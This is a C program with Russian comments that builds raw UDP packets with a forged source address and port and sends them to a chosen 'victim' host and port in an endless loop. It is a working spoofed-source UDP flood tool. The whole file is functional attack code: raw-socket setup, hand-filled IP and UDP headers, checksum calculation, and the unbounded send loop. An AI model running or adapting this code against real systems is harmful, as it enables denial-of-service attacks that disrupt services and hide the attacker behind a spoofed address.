#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netdb.h>

/*--------------------------------------*/
/* Преобразование имени узла в IP-адрес */
/*--------------------------------------*/
unsigned long resolve(char *hostname)
{
  struct hostent *hp;

  if ( (hp = gethostbyname(hostname)) == NULL) {
    herror("gethostbyname() failed");
    exit(-1);
  }

  return *(unsigned long *)hp->h_addr_list[0];
}

/*------------------------------*/
/* Вычисление контрольной суммы */
/*------------------------------*/
unsigned short in_cksum(unsigned short *addr, int len)
{
  unsigned short result;
  unsigned int sum = 0;

  /* складываем все двухбайтовые слова */
  while (len > 1)
 {
    sum += *addr++;
    len -= 2;
  }

  /* если остался лишний байт, прибавляем его к сумме */
  if (len == 1)
    sum += *(unsigned char*) addr;
    
  sum = (sum >> 16) + (sum & 0xFFFF);
 /* добавляем перенос */
  sum += (sum >> 16);
                 /* еще раз */
  result = ~sum;
                      /* инвертируем результат */
  return result;
}


/*------------------------*/
/* Главная функция main() */
/*------------------------*/
int main(int argc, char *argv[])
{
  int sd;
  const int on = 1;
  unsigned long dstaddr, srcaddr;
  int dport, sport;
  struct sockaddr_in servaddr;

  /* структура псевдозаголовка */
  struct pseudohdr
  {
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char place_holder;
    unsigned char protocol;
    unsigned short length;
  } pseudo_hdr;

  char sendbuf[sizeof(struct iphdr) + sizeof(struct udphdr)];
  struct iphdr *ip_hdr = (struct iphdr *)sendbuf;
  struct udphdr *udp_hdr = (struct udphdr *) (sendbuf + sizeof(struct iphdr));
  unsigned char *pseudo_packet;
 /* указатель на псевдопакет */

  if (argc != 5)
 {
    fprintf(stderr,
    "Usage: %s <source address> <source port> <destination address> <destination port>\n", 
    argv[0]);
    exit(-1);
  }
  

  /* создаем raw-сокет */
  if ( (sd = socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
 {
    perror("socket() failed");
    exit(-1);
  }

  /* так как будем самостоятельно заполнять IP-заголовок,
  то устанавливаем опцию IP_HDRINCL */
  if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on)) < 0)
 {
    perror("setsockopt() failed");
    exit(-1);
  }

  srcaddr = resolve(argv[1]);
 /* IP-адрес источника */
  sport = atoi(argv[2]);
      /* порт источника     */

  dstaddr = resolve(argv[3]);
 /* IP-адрес жертвы    */
  dport = atoi(argv[4]);
      /* порт жертвы        */

  bzero(&servaddr, sizeof(servaddr));
  servaddr.sin_family = AF_INET;
  servaddr.sin_port = htons(dport);
  servaddr.sin_addr.s_addr = dstaddr;

  /* заполняем IP-заголовок */
  ip_hdr->ihl = 5;
  ip_hdr->version = 4;
  ip_hdr->tos = 0;
  ip_hdr->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr));
  ip_hdr->id = 0;
  ip_hdr->frag_off = 0;
  ip_hdr->ttl = 255;
  ip_hdr->protocol = IPPROTO_UDP;
  ip_hdr->check = 0;
  ip_hdr->check = in_cksum((unsigned short *)ip_hdr, sizeof(struct iphdr));
  
  ip_hdr->saddr = srcaddr;
  ip_hdr->daddr = dstaddr;
  
  /* заполняем псевдозаголовок */
  pseudo_hdr.source_address = srcaddr;
  pseudo_hdr.dest_address = dstaddr;
  pseudo_hdr.place_holder = 0;
  pseudo_hdr.protocol = IPPROTO_UDP;
  pseudo_hdr.length = htons(sizeof(struct udphdr));
 
  /* заполняем UDP-заголовок */
  udp_hdr->source = htons(sport);
  udp_hdr->dest = htons(dport);
  udp_hdr->len = htons(sizeof(struct udphdr));
  udp_hdr->check = 0;

  /* выделяем место в памяти для формирования псевдопакета */
  if ( (pseudo_packet = (char*)malloc(sizeof(pseudo_hdr) + 
        sizeof(struct udphdr))) == NULL) {
    perror("malloc() failed");
    exit(-1);
  }
  
  /* копируем псевдозаголовок в начало псевдопакета */
  memcpy(pseudo_packet, &pseudo_hdr, sizeof(pseudo_hdr));
  
  /* затем копируем UDP-заголовок */
  memcpy(pseudo_packet + sizeof(pseudo_hdr), sendbuf + 
         sizeof(struct iphdr), sizeof(struct udphdr));
 
  /* теперь можно вычислить контрольную сумму в UDP-заголовке */
  if ( (udp_hdr->check = in_cksum((unsigned short *)pseudo_packet, 
        sizeof(pseudo_hdr) + sizeof(struct udphdr))) == 0)
    udp_hdr->check = 0xffff;

  /* в бесконечном цикле отправляем пакеты */
  while (1) {
    if (sendto(sd, 
               sendbuf, 
  	       sizeof(sendbuf), 
	       0, 
	       (struct sockaddr *)&servaddr, 
	       sizeof(servaddr))  < 0) {
      perror("sendto() failed");
      exit(-1);
    }
  }

  return 0;
}

